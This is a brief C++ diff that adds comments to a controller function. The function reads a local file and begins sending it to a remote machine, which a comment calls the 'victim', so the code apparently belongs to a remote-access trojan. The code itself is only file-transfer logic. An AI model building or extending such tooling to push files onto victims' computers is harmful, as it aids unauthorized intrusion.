@@ -694,18 +694,22 @@ void Controller::displayList()
 }
 
 void Controller::startSendingFile()
-{        
+{   
+    //get the file path
     std::string path = Mlib::getOpenFilePath("All Files (*.*)\0*.*\0");
     file = new std::ifstream(path, std::ios::binary | std::ios::in);
     if (!file->is_open())
         return;
 
+    //get the size of the file
     file->ignore(std::numeric_limits<std::streamsize>::max());
     fileSize = int(file->gcount());
     file->seekg(0);
 
+    //store the extention for later
     ext = path.substr(path.find_first_of('.'));
 
+    //create file on victim
     sf::Packet p;
     p << sf::Uint8('f');
     sendServer(p);
